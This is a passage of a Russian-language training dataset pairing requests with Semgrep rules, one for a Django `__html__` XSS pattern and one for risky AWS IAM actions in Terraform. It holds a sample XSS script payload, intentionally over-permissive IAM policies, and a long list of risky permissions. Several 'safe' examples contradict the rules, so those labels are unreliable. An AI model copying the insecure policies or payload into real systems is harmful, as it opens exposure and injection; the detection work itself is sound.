    "instruction": "Создай правило Semgrep для обнаружения html-magic-method\nОписание уязвимости: The `__html__` method indicates to the Django template engine that the value is 'safe' for rendering. This means that normal HTML escaping will not be applied to the return value. This exposes your application to cross-site scripting (XSS) vulnerabilities. If you need to render raw HTML, consider instead using `mark_safe()` which more clearly marks the intent to render raw HTML than a class with a magic method.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: html-magic-method.py\nfrom django.template import Context, Template\nfrom django.test import SimpleTestCase\nfrom django.utils import html\nfrom django.utils.functional import lazy, lazystr\nfrom django.utils.safestring import SafeData, mark_safe\n\n\n# cf. https://github.com/django/django/blob/d17b380653da5f95885ce53468fe7aac60672841/tests/utils_tests/test_safestring.py#L8\nclass customescape(str):\n    # ruleid: html-magic-method\n    def __html__(self):\n        # Implement specific and wrong escaping in order to be able to detect\n        # when it runs.\n        return self.replace('<', '<<').replace('>', '>>')\n\nclass someotherclass(str):\n    # ok: html-magic-method\n    def __init__(self):\n        print('hello')  # Ограничиваем длину\n\nОпасные паттерны:\n• class customescape(str):\\n    # ruleid: html-magic-method\\n    def __html__(self):\\n        return self.replace('<', '<<').replace('>', '>>')\n• class anothercustomescape(str):\\n    # ruleid: html-magic-method\\n    def __html__(self):\\n        return '<script>alert(\\'XSS\\');</script>'\n\nБезопасные паттерны:  \n• class someotherclass(str):\\n    # ok: html-magic-method\\n    def __init__(self):\\n        print('hello')\n• class otherclass(str):\\n    # ok: html-magic-method\\n    def __html__(self):\\n        return mark_safe('<strong>Hello</strong>')\n\nЛегенда аннотаций:\n- // ruleid:html-magic-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:html-magic-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: html-magic-method\n  message: >-\n    The `__html__` method indicates to the Django template engine that the\n    value is 'safe' for rendering. This means that normal HTML escaping will\n    not be applied to the return value. This exposes your application to\n    cross-site scripting (XSS) vulnerabilities. If you need to render raw HTML,\n    consider instead using `mark_safe()` which more clearly marks the intent\n    to render raw HTML than a class with a magic method.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://docs.djangoproject.com/en/3.0/_modules/django/utils/html/#conditional_escape\n    - https://gist.github.com/minusworld/7885d8a81dba3ea2d1e4b8fd3c218ef5\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - python\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      class $CLASS(...):\n        ...\n  - pattern: |\n      def __html__(...):\n        ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска классов, которые переопределяют метод __html__, что сигнализирует Django о том, что значение безопасно для рендеринга без применения обычного HTML-экранинга. Это может привести к XSS-уязвимостям, поскольку не выполняется надлежащая защита от инъекций. Правило использует шаблон pattern-inside для поиска класса и шаблон pattern для поиска определения метода __html__. Метод должен быть обнаружен внутри класса.\n\n# Ключевые элементы:\n- ID: html-magic-method\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "html-magic-method",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения no-iam-resource-exposure\nОписание уязвимости: Ensure IAM policies don't allow resource exposure. These actions can expose AWS resources to the public. For example `ecr:SetRepositoryPolicy` could let an attacker retrieve container images. Instead, use another action that doesn't expose AWS resources.\nCWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: no-iam-resource-exposure.tf\nresource \"aws_iam_user_policy\" \"lb_ro\" {\n  name = \"test\"\n  user = aws_iam_user.lb.name\n\n  # Terraform's \"jsonencode\" function converts a\n  # Terraform expression result to valid JSON syntax.\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ok: no-iam-resource-exposure\n        Action = [\n          \"ec2:Describe*\",\n        ]\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      },\n    ]\n  })\n}\n\nresource \"aws_iam_group_policy\" \"policy\" {\n  name        = \"test_policy\"\n  path        = \"/\"\n  description = \"My test policy\"\n\n  # Terraform's \"jsonencode\" function converts a\n  # Terraform expression result to valid JSON syntax.\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ruleid: no-iam-resource-exposure\n        Action = \"backup:DeleteBackupVaultAccessPolicy\"\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      },\n    ]\n  })\n}\n\nresource \"aws_iam_policy\" \"policy\" {\n  name        = \"test_policy\"\n  path        = \"/\"\n  description = \"My test policy\"\n\n  # Terraform's \"jsonencode\" function converts a\n  # Terraform expression result to valid JSON syntax.\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ruleid: no-iam-resource-exposure\n        Action = [\"ecr:SetRepositoryPolicy\"]\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      },\n    ]\n  })\n}\n\ndata aws_iam_policy_document \"policy\" {\n   statement {\n     # ruleid: no-iam-resource-exposure\n     actions = [\"es:*\"]\n     principals {\n       type        = \"AWS\"\n       identifiers = [\"*\"]\n     }\n     resources = [\"*\"]\n   }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_iam_user_policy\" \"lb_ro\" { ...\n  policy = jsonencode({... Statement = [... Action = [\"ecr:SetRepositoryPolicy\"] ...] ...}) ... }\n• resource \"aws_iam_group_policy\" \"policy\" { ...\n  policy = jsonencode({... Statement = [... Action = [\"backup:DeleteBackupVaultAccessPolicy\"] ...] ...}) ... }\n• data aws_iam_policy_document \"policy\" { ...\n  statement {\n    actions = [\"es:*\"]\n    ...\n  }\n}\n\nБезопасные паттерны:  \n• resource \"aws_iam_user_policy\" \"lb_ro\" { ...\n  policy = jsonencode({... Statement = [... Action = [\"ec2:Describe*\"] ...] ...}) ... }\n• resource \"aws_iam_group_policy\" \"policy\" { ...\n  policy = jsonencode({... Statement = [... Action = [\"apigateway:UpdateRestApiPolicy\", \"apigateway:DeleteRestApiPolicy\"] ...] ...}) ... }\n• data aws_iam_policy_document \"policy\" { ...\n  statement {\n    actions = [\"apigateway:UpdateRestApiPolicy\", \"apigateway:DeleteRestApiPolicy\"]\n    ...\n  }\n}\n\nЛегенда аннотаций:\n- // ruleid:no-iam-resource-exposure: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:no-iam-resource-exposure: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: no-iam-resource-exposure\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-inside: |\n          resource $TYPE \"...\" {\n            ...\n            policy = jsonencode({\n              ...\n              Statement = [\n                ...\n              ]\n              ...\n            })\n            ...\n          }\n      - pattern-not-inside: |\n          resource $TYPE \"...\" {\n            ...\n            policy = jsonencode({\n              ...\n              Statement = [\n                ...,\n                {... Effect = \"Deny\" ...},\n                ...\n              ]\n              ...\n            })\n            ...\n          }\n      - pattern: |\n          Action = $ACTION\n      - metavariable-pattern:\n          metavariable: $TYPE\n          pattern-either:\n          - pattern: |\n              \"aws_iam_role_policy\"\n          - pattern: |\n              \"aws_iam_policy\"\n          - pattern: |\n              \"aws_iam_user_policy\"\n          - pattern: |\n              \"aws_iam_group_policy\"\n    - patterns:\n      - pattern-inside: |\n          data aws_iam_policy_document \"...\" {\n            ...\n            statement {\n              ...\n            }\n            ...\n          }\n      - pattern-not-inside: |\n          data aws_iam_policy_document \"...\" {\n            ...\n            statement {\n              ...\n              effect = \"Deny\"\n              ...\n            }\n            ...\n          }\n      - pattern: |\n          actions = [..., $ACTION, ...]\n  - metavariable-pattern:\n      metavariable: $ACTION\n      pattern-either:\n      - pattern: |\n          \"acm-pca:CreatePermission\"\n      - pattern: |\n          \"acm-pca:DeletePermission\"\n      - pattern: |\n          \"acm-pca:DeletePolicy\"\n      - pattern: |\n          \"acm-pca:PutPolicy\"\n      - pattern: |\n          \"apigateway:UpdateRestApiPolicy\"\n      - pattern: |\n          \"backup:DeleteBackupVaultAccessPolicy\"\n      - pattern: |\n          \"backup:PutBackupVaultAccessPolicy\"\n      - pattern: |\n          \"chime:DeleteVoiceConnectorTerminationCredentials\"\n      - pattern: |\n          \"chime:PutVoiceConnectorTerminationCredentials\"\n      - pattern: |\n          \"cloudformation:SetStackPolicy\"\n      - pattern: |\n          \"cloudsearch:UpdateServiceAccessPolicies\"\n      - pattern: |\n          \"codeartifact:DeleteDomainPermissionsPolicy\"\n      - pattern: |\n          \"codeartifact:DeleteRepositoryPermissionsPolicy\"\n      - pattern: |\n          \"codebuild:DeleteResourcePolicy\"\n      - pattern: |\n          \"codebuild:DeleteSourceCredentials\"\n      - pattern: |\n          \"codebuild:ImportSourceCredentials\"\n      - pattern: |\n          \"codebuild:PutResourcePolicy\"\n      - pattern: |\n          \"codeguru-profiler:PutPermission\"\n      - pattern: |\n          \"codeguru-profiler:RemovePermission\"\n      - pattern: |\n          \"codestar:AssociateTeamMember\"\n      - pattern: |\n          \"codestar:CreateProject\"\n      - pattern: |\n          \"codestar:DeleteProject\"\n      - pattern: |\n          \"codestar:DisassociateTeamMember\"\n      - pattern: |\n          \"codestar:UpdateTeamMember\"\n      - pattern: |\n          \"cognito-identity:CreateIdentityPool\"\n      - pattern: |\n          \"cognito-identity:DeleteIdentities\"\n      - pattern: |\n          \"cognito-identity:DeleteIdentityPool\"\n      - pattern: |\n          \"cognito-identity:GetId\"\n      - pattern: |\n          \"cognito-identity:MergeDeveloperIdentities\"\n      - pattern: |\n          \"cognito-identity:SetIdentityPoolRoles\"\n      - pattern: |\n          \"cognito-identity:UnlinkDeveloperIdentity\"\n      - pattern: |\n          \"cognito-identity:UnlinkIdentity\"\n      - pattern: |\n          \"cognito-identity:UpdateIdentityPool\"\n      - pattern: |\n          \"deeplens:AssociateServiceRoleToAccount\"\n      - pattern: |\n          \"ds:CreateConditionalForwarder\"\n      - pattern: |\n          \"ds:CreateDirectory\"\n      - pattern: |\n          \"ds:CreateMicrosoftAD\"\n      - pattern: |\n          \"ds:CreateTrust\"\n      - pattern: |\n          \"ds:ShareDirectory\"\n      - pattern: |\n          \"ec2:CreateNetworkInterfacePermission\"\n      - pattern: |\n          \"ec2:DeleteNetworkInterfacePermission\"\n      - pattern: |\n          \"ec2:ModifySnapshotAttribute\"\n      - pattern: |\n          \"ec2:ModifyVpcEndpointServicePermissions\"\n      - pattern: |\n          \"ec2:ResetSnapshotAttribute\"\n      - pattern: |\n          \"ecr:DeleteRepositoryPolicy\"\n      - pattern: |\n          \"ecr:SetRepositoryPolicy\"\n      - pattern: |\n          \"elasticfilesystem:DeleteFileSystemPolicy\"\n      - pattern: |\n          \"elasticfilesystem:PutFileSystemPolicy\"\n      - pattern: |\n          \"elasticmapreduce:PutBlockPublicAccessConfiguration\"\n      - pattern: |\n          \"es:CreateElasticsearchDomain\"\n      - pattern: |\n          \"es:UpdateElasticsearchDomainConfig\"\n      - pattern: |\n          \"glacier:AbortVaultLock\"\n      - pattern: |\n          \"glacier:CompleteVaultLock\"\n      - pattern: |\n          \"glacier:DeleteVaultAccessPolicy\"\n      - pattern: |\n          \"glacier:InitiateVaultLock\"\n      - pattern: |\n          \"glacier:SetDataRetrievalPolicy\"\n      - pattern: |\n          \"glacier:SetVaultAccessPolicy\"\n      - pattern: |\n          \"glue:DeleteResourcePolicy\"\n      - pattern: |\n          \"glue:PutResourcePolicy\"\n      - pattern: |\n          \"greengrass:AssociateServiceRoleToAccount\"\n      - pattern: |\n          \"health:DisableHealthServiceAccessForOrganization\"\n      - pattern: |\n          \"health:EnableHealthServiceAccessForOrganization\"\n      - pattern: |\n          \"iam:AddClientIDToOpenIDConnectProvider\"\n      - pattern: |\n          \"iam:AddRoleToInstanceProfile\"\n      - pattern: |\n          \"iam:AddUserToGroup\"\n      - pattern: |\n          \"iam:AttachGroupPolicy\"\n      - pattern: |\n          \"iam:AttachRolePolicy\"\n      - pattern: |\n          \"iam:AttachUserPolicy\"\n      - pattern: |\n          \"iam:ChangePassword\"\n      - pattern: |\n          \"iam:CreateAccessKey\"\n      - pattern: |\n          \"iam:CreateAccountAlias\"\n      - pattern: |\n          \"iam:CreateGroup\"\n      - pattern: |\n          \"iam:CreateInstanceProfile\"\n      - pattern: |\n          \"iam:CreateLoginProfile\"\n      - pattern: |\n          \"iam:CreateOpenIDConnectProvider\"\n      - pattern: |\n          \"iam:CreatePolicy\"\n      - pattern: |\n          \"iam:CreatePolicyVersion\"\n      - pattern: |\n          \"iam:CreateRole\"\n      - pattern: |\n          \"iam:CreateSAMLProvider\"\n      - pattern: |\n          \"iam:CreateServiceLinkedRole\"\n      - pattern: |\n          \"iam:CreateServiceSpecificCredential\"\n      - pattern: |\n          \"iam:CreateUser\"\n      - pattern: |\n          \"iam:CreateVirtualMFADevice\"\n      - pattern: |\n          \"iam:DeactivateMFADevice\"\n      - pattern: |\n          \"iam:DeleteAccessKey\"\n      - pattern: |\n          \"iam:DeleteAccountAlias\"\n      - pattern: |\n          \"iam:DeleteAccountPasswordPolicy\"\n      - pattern: |\n          \"iam:DeleteGroup\"\n      - pattern: |\n          \"iam:DeleteGroupPolicy\"\n      - pattern: |\n          \"iam:DeleteInstanceProfile\"\n      - pattern: |\n          \"iam:DeleteLoginProfile\"\n      - pattern: |\n          \"iam:DeleteOpenIDConnectProvider\"\n      - pattern: |\n          \"iam:DeletePolicy\"\n      - pattern: |\n          \"iam:DeletePolicyVersion\"\n      - pattern: |\n          \"iam:DeleteRole\"\n      - pattern: |\n          \"iam:DeleteRolePermissionsBoundary\"\n      - pattern: |\n          \"iam:DeleteRolePolicy\"\n      - pattern: |\n          \"iam:DeleteSAMLProvider\"\n      - pattern: |\n          \"iam:DeleteSSHPublicKey\"\n      - pattern: |\n          \"iam:DeleteServerCertificate\"\n      - pattern: |\n          \"iam:DeleteServiceLinkedRole\"\n      - pattern: |\n          \"iam:DeleteServiceSpecificCredential\"\n      - pattern: |\n          \"iam:DeleteSigningCertificate\"\n      - pattern: |\n          \"iam:DeleteUser\"\n      - pattern: |\n          \"iam:DeleteUserPermissionsBoundary\"\n      - pattern: |\n          \"iam:DeleteUserPolicy\"\n      - pattern: |\n          \"iam:DeleteVirtualMFADevice\"\n      - pattern: |\n          \"iam:DetachGroupPolicy\"\n      - pattern: |\n          \"iam:DetachRolePolicy\"\n      - pattern: |\n          \"iam:DetachUserPolicy\"\n      - pattern: |\n          \"iam:EnableMFADevice\"\n      - pattern: |\n          \"iam:PassRole\"\n      - pattern: |\n          \"iam:PutGroupPolicy\"\n      - pattern: |\n          \"iam:PutRolePermissionsBoundary\"\n      - pattern: |\n          \"iam:PutRolePolicy\"\n      - pattern: |\n          \"iam:PutUserPermissionsBoundary\"\n      - pattern: |\n          \"iam:PutUserPolicy\"\n      - pattern: |\n          \"iam:RemoveClientIDFromOpenIDConnectProvider\"\n      - pattern: |\n          \"iam:RemoveRoleFromInstanceProfile\"\n      - pattern: |\n          \"iam:RemoveUserFromGroup\"\n      - pattern: |\n          \"iam:ResetServiceSpecificCredential\"\n      - pattern: |\n          \"iam:ResyncMFADevice\"\n      - pattern: |\n          \"iam:SetDefaultPolicyVersion\"\n      - pattern: |\n          \"iam:SetSecurityTokenServicePreferences\"\n      - pattern: |\n          \"iam:UpdateAccessKey\"\n      - pattern: |\n          \"iam:UpdateAccountPasswordPolicy\"\n      - pattern: |\n          \"iam:UpdateAssumeRolePolicy\"\n      - pattern: |\n          \"iam:UpdateGroup\"\n      - pattern: |\n          \"iam:UpdateLoginProfile\"\n      - pattern: |\n          \"iam:UpdateOpenIDConnectProviderThumbprint\"\n      - pattern: |\n          \"iam:UpdateRole\"\n      - pattern: |\n          \"iam:UpdateRoleDescription\"\n      - pattern: |\n          \"iam:UpdateSAMLProvider\"\n      - pattern: |\n          \"iam:UpdateSSHPublicKey\"\n      - pattern: |\n          \"iam:UpdateServerCertificate\"\n      - pattern: |\n          \"iam:UpdateServiceSpecificCredential\"\n      - pattern: |\n          \"iam:UpdateSigningCertificate\"\n      - pattern: |\n          \"iam:UpdateUser\"\n      - pattern: |\n          \"iam:UploadSSHPublicKey\"\n      - pattern: |\n          \"iam:UploadServerCertificate\"\n      - pattern: |\n          \"iam:UploadSigningCertificate\"\n      - pattern: |\n          \"imagebuilder:PutComponentPolicy\"\n      - pattern: |\n          \"imagebuilder:PutImagePolicy\"\n      - pattern: |\n          \"imagebuilder:PutImageRecipePolicy\"\n      - pattern: |\n          \"iot:AttachPolicy\"\n      - pattern: |\n          \"iot:AttachPrincipalPolicy\"\n      - pattern: |\n          \"iot:DetachPolicy\"\n      - pattern: |\n          \"iot:DetachPrincipalPolicy\"\n      - pattern: |\n          \"iot:SetDefaultAuthorizer\"\n      - pattern: |\n          \"iot:SetDefaultPolicyVersion\"\n      - pattern: |\n          \"iotsitewise:CreateAccessPolicy\"\n      - pattern: |\n          \"iotsitewise:DeleteAccessPolicy\"\n      - pattern: |\n          \"iotsitewise:UpdateAccessPolicy\"\n      - pattern: |\n          \"kms:CreateGrant\"\n      - pattern: |\n          \"kms:PutKeyPolicy\"\n      - pattern: |\n          \"kms:RetireGrant\"\n      - pattern: |\n          \"kms:RevokeGrant\"\n      - pattern: |\n          \"lakeformation:BatchGrantPermissions\"\n      - pattern: |\n          \"lakeformation:BatchRevokePermissions\"\n      - pattern: |\n          \"lakeformation:GrantPermissions\"\n      - pattern: |\n          \"lakeformation:PutDataLakeSettings\"\n      - pattern: |\n          \"lakeformation:RevokePermissions\"\n      - pattern: |\n          \"lambda:AddLayerVersionPermission\"\n      - pattern: |\n          \"lambda:AddPermission\"\n      - pattern: |\n          \"lambda:DisableReplication\"\n      - pattern: |\n          \"lambda:EnableReplication\"\n      - pattern: |\n          \"lambda:RemoveLayerVersionPermission\"\n      - pattern: |\n          \"lambda:RemovePermission\"\n      - pattern: |\n          \"license-manager:UpdateServiceSettings\"\n      - pattern: |\n          \"lightsail:GetRelationalDatabaseMasterUserPassword\"\n      - pattern: |\n          \"logs:DeleteResourcePolicy\"\n      - pattern: |\n          \"logs:PutResourcePolicy\"\n      - pattern: |\n          \"mediapackage:RotateIngestEndpointCredentials\"\n      - pattern: |\n          \"mediastore:DeleteContainerPolicy\"\n      - pattern: |\n          \"mediastore:PutContainerPolicy\"\n      - pattern: |\n          \"opsworks:SetPermission\"\n      - pattern: |\n          \"opsworks:UpdateUserProfile\"\n      - pattern: |\n          \"quicksight:CreateAdmin\"\n      - pattern: |\n          \"quicksight:CreateGroup\"\n      - pattern: |\n          \"quicksight:CreateGroupMembership\"\n      - pattern: |\n          \"quicksight:CreateIAMPolicyAssignment\"\n      - pattern: |\n          \"quicksight:CreateUser\"\n      - pattern: |\n          \"quicksight:DeleteGroup\"\n      - pattern: |\n          \"quicksight:DeleteGroupMembership\"\n      - pattern: |\n          \"quicksight:DeleteIAMPolicyAssignment\"\n      - pattern: |\n          \"quicksight:DeleteUser\"\n      - pattern: |\n          \"quicksight:DeleteUserByPrincipalId\"\n      - pattern: |\n          \"quicksight:RegisterUser\"\n      - pattern: |\n          \"quicksight:UpdateDashboardPermissions\"\n      - pattern: |\n          \"quicksight:UpdateGroup\"\n      - pattern: |\n          \"quicksight:UpdateIAMPolicyAssignment\"\n      - pattern: |\n          \"quicksight:UpdateTemplatePermissions\"\n      - pattern: |\n          \"quicksight:UpdateUser\"\n      - pattern: |\n          \"ram:AcceptResourceShareInvitation\"\n      - pattern: |\n          \"ram:AssociateResourceShare\"\n      - pattern: |\n          \"ram:CreateResourceShare\"\n      - pattern: |\n          \"ram:DeleteResourceShare\"\n      - pattern: |\n          \"ram:DisassociateResourceShare\"\n      - pattern: |\n          \"ram:EnableSharingWithAwsOrganization\"\n      - pattern: |\n          \"ram:RejectResourceShareInvitation\"\n      - pattern: |\n          \"ram:UpdateResourceShare\"\n      - pattern: |\n          \"rds:AuthorizeDBSecurityGroupIngress\"\n      - pattern: |\n          \"rds-db:connect\"\n      - pattern: |\n          \"redshift:AuthorizeSnapshotAccess\"\n      - pattern: |\n          \"redshift:CreateClusterUser\"\n      - pattern: |\n          \"redshift:CreateSnapshotCopyGrant\"\n      - pattern: |\n          \"redshift:JoinGroup\"\n      - pattern: |\n          \"redshift:ModifyClusterIamRoles\"\n      - pattern: |\n          \"redshift:RevokeSnapshotAccess\"\n      - pattern: |\n          \"route53resolver:PutResolverRulePolicy\"\n      - pattern: |\n          \"s3:BypassGovernanceRetention\"\n      - pattern: |\n          \"s3:DeleteAccessPointPolicy\"\n      - pattern: |\n          \"s3:DeleteBucketPolicy\"\n      - pattern: |\n          \"s3:ObjectOwnerOverrideToBucketOwner\"\n      - pattern: |\n          \"s3:PutAccessPointPolicy\"\n      - pattern: |\n          \"s3:PutAccountPublicAccessBlock\"\n      - pattern: |\n          \"s3:PutBucketAcl\"\n      - pattern: |\n          \"s3:PutBucketPolicy\"\n      - pattern: |\n          \"s3:PutBucketPublicAccessBlock\"\n      - pattern: |\n          \"s3:PutObjectAcl\"\n      - pattern: |\n          \"s3:PutObjectVersionAcl\"\n      - pattern: |\n          \"secretsmanager:DeleteResourcePolicy\"\n      - pattern: |\n          \"secretsmanager:PutResourcePolicy\"\n      - pattern: |\n          \"secretsmanager:ValidateResourcePolicy\"\n      - pattern: |\n          \"servicecatalog:CreatePortfolioShare\"\n      - pattern: |\n          \"servicecatalog:DeletePortfolioShare\"\n      - pattern: |\n          \"sns:AddPermission\"\n      - pattern: |\n          \"sns:CreateTopic\"\n      - pattern: |\n          \"sns:RemovePermission\"\n      - pattern: |\n          \"sns:SetTopicAttributes\"\n      - pattern: |\n          \"sqs:AddPermission\"\n      - pattern: |\n          \"sqs:CreateQueue\"\n      - pattern: |\n          \"sqs:RemovePermission\"\n      - pattern: |\n          \"sqs:SetQueueAttributes\"\n      - pattern: |\n          \"ssm:ModifyDocumentPermission\"\n      - pattern: |\n          \"sso:AssociateDirectory\"\n      - pattern: |\n          \"sso:AssociateProfile\"\n      - pattern: |\n          \"sso:CreateApplicationInstance\"\n      - pattern: |\n          \"sso:CreateApplicationInstanceCertificate\"\n      - pattern: |\n          \"sso:CreatePermissionSet\"\n      - pattern: |\n          \"sso:CreateProfile\"\n      - pattern: |\n          \"sso:CreateTrust\"\n      - pattern: |\n          \"sso:DeleteApplicationInstance\"\n      - pattern: |\n          \"sso:DeleteApplicationInstanceCertificate\"\n      - pattern: |\n          \"sso:DeletePermissionSet\"\n      - pattern: |\n          \"sso:DeletePermissionsPolicy\"\n      - pattern: |\n          \"sso:DeleteProfile\"\n      - pattern: |\n          \"sso:DisassociateDirectory\"\n      - pattern: |\n          \"sso:DisassociateProfile\"\n      - pattern: |\n          \"sso:ImportApplicationInstanceServiceProviderMetadata\"\n      - pattern: |\n          \"sso:PutPermissionsPolicy\"\n      - pattern: |\n          \"sso:StartSSO\"\n      - pattern: |\n          \"sso:UpdateApplicationInstanceActiveCertificate\"\n      - pattern: |\n          \"sso:UpdateApplicationInstanceDisplayData\"\n      - pattern: |\n          \"sso:UpdateApplicationInstanceResponseConfiguration\"\n      - pattern: |\n          \"sso:UpdateApplicationInstanceResponseSchemaConfiguration\"\n      - pattern: |\n          \"sso:UpdateApplicationInstanceSecurityConfiguration\"\n      - pattern: |\n          \"sso:UpdateApplicationInstanceServiceProviderConfiguration\"\n      - pattern: |\n          \"sso:UpdateApplicationInstanceStatus\"\n      - pattern: |\n          \"sso:UpdateDirectoryAssociation\"\n      - pattern: |\n          \"sso:UpdatePermissionSet\"\n      - pattern: |\n          \"sso:UpdateProfile\"\n      - pattern: |\n          \"sso:UpdateSSOConfiguration\"\n      - pattern: |\n          \"sso:UpdateTrust\"\n      - pattern: |\n          \"sso-directory:AddMemberToGroup\"\n      - pattern: |\n          \"sso-directory:CreateAlias\"\n      - pattern: |\n          \"sso-directory:CreateGroup\"\n      - pattern: |\n          \"sso-directory:CreateUser\"\n      - pattern: |\n          \"sso-directory:DeleteGroup\"\n      - pattern: |\n          \"sso-directory:DeleteUser\"\n      - pattern: |\n          \"sso-directory:DisableUser\"\n      - pattern: |\n          \"sso-directory:EnableUser\"\n      - pattern: |\n          \"sso-directory:RemoveMemberFromGroup\"\n      - pattern: |\n          \"sso-directory:UpdateGroup\"\n      - pattern: |\n          \"sso-directory:UpdatePassword\"\n      - pattern: |\n          \"sso-directory:UpdateUser\"\n      - pattern: |\n          \"sso-directory:VerifyEmail\"\n      - pattern: |\n          \"storagegateway:DeleteChapCredentials\"\n      - pattern: |\n          \"storagegateway:SetLocalConsolePassword\"\n      - pattern: |\n          \"storagegateway:SetSMBGuestPassword\"\n      - pattern: |\n          \"storagegateway:UpdateChapCredentials\"\n      - pattern: |\n          \"waf:DeletePermissionPolicy\"\n      - pattern: |\n          \"waf:PutPermissionPolicy\"\n      - pattern: |\n          \"waf-regional:DeletePermissionPolicy\"\n      - pattern: |\n          \"waf-regional:PutPermissionPolicy\"\n      - pattern: |\n          \"wafv2:CreateWebACL\"\n      - pattern: |\n          \"wafv2:DeletePermissionPolicy\"\n      - pattern: |\n          \"wafv2:DeleteWebACL\"\n      - pattern: |\n          \"wafv2:PutPermissionPolicy\"\n      - pattern: |\n          \"wafv2:UpdateWebACL\"\n      - pattern: |\n          \"worklink:UpdateDevicePolicyConfiguration\"\n      - pattern: |\n          \"workmail:ResetPassword\"\n      - pattern: |\n          \"workmail:ResetUserPassword\"\n      - pattern: |\n          \"xray:PutEncryptionConfig\"\n      - pattern: |\n          \"worklink:*\"\n      - pattern: |\n          \"route53resolver:*\"\n      - pattern: |\n          \"es:*\"\n      - pattern: |\n          \"greengrass:*\"\n      - pattern: |\n          \"redshift:*\"\n      - pattern: |\n          \"license-manager:*\"\n      - pattern: |\n          \"rds:*\"\n      - pattern: |\n          \"lambda:*\"\n      - pattern: |\n          \"elasticfilesystem:*\"\n      - pattern: |\n          \"logs:*\"\n      - pattern: |\n          \"sso:*\"\n      - pattern: |\n          \"waf:*\"\n      - pattern: |\n          \"mediastore:*\"\n      - pattern: |\n          \"acm-pca:*\"\n      - pattern: |\n          \"sso-directory:*\"\n      - pattern: |\n          \"imagebuilder:*\"\n      - pattern: |\n          \"sqs:*\"\n      - pattern: |\n          \"codeguru-profiler:*\"\n      - pattern: |\n          \"wafv2:*\"\n      - pattern: |\n          \"cloudformation:*\"\n      - pattern: |\n          \"xray:*\"\n      - pattern: |\n          \"codeartifact:*\"\n      - pattern: |\n          \"iotsitewise:*\"\n      - pattern: |\n          \"workmail:*\"\n      - pattern: |\n          \"glue:*\"\n      - pattern: |\n          \"deeplens:*\"\n      - pattern: |\n          \"chime:*\"\n      - pattern: |\n          \"mediapackage:*\"\n      - pattern: |\n          \"opsworks:*\"\n      - pattern: |\n          \"ds:*\"\n      - pattern: |\n          \"ram:*\"\n      - pattern: |\n          \"iam:*\"\n      - pattern: |\n          \"waf-regional:*\"\n      - pattern: |\n          \"glacier:*\"\n      - pattern: |\n          \"cloudsearch:*\"\n      - pattern: |\n          \"lakeformation:*\"\n      - pattern: |\n          \"elasticmapreduce:*\"\n      - pattern: |\n          \"quicksight:*\"\n      - pattern: |\n          \"sns:*\"\n      - pattern: |\n          \"ec2:*\"\n      - pattern: |\n          \"health:*\"\n      - pattern: |\n          \"lightsail:*\"\n      - pattern: |\n          \"codestar:*\"\n      - pattern: |\n          \"kms:*\"\n      - pattern: |\n          \"codebuild:*\"\n      - pattern: |\n          \"s3:*\"\n      - pattern: |\n          \"cognito-identity:*\"\n      - pattern: |\n          \"apigateway:*\"\n      - pattern: |\n          \"rds-db:*\"\n      - pattern: |\n          \"iot:*\"\n      - pattern: |\n          \"backup:*\"\n      - pattern: |\n          \"secretsmanager:*\"\n      - pattern: |\n          \"servicecatalog:*\"\n      - pattern: |\n          \"ssm:*\"\n      - pattern: |\n          \"storagegateway:*\"\n      - pattern: |\n          \"ecr:*\"\n  message: >-\n    Ensure IAM policies don't allow resource exposure. These actions can expose AWS resources to the public.\n    For example `ecr:SetRepositoryPolicy` could let an attacker retrieve container images. Instead,\n    use another action that doesn't expose AWS resources.\n  metadata:\n    references:\n    - https://cloudsplaining.readthedocs.io/en/latest/glossary/resource-exposure/\n    - https://github.com/bridgecrewio/checkov/blob/ca830e14745c2c8e1b941985f305abe985d7f1f9/checkov/terraform/checks/data/aws/IAMPermissionsManagement.py\n    category: security\n    cwe:\n    - 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor'\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A01:2021 - Broken Access Control\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска политик IAM в конфигурациях Terraform, которые могут привести к раскрытию ресурсов AWS злоумышленникам. Правило проверяет ресурсы, такие как 'aws_iam_user_policy', 'aws_iam_group_policy' и 'aws_iam_policy', а 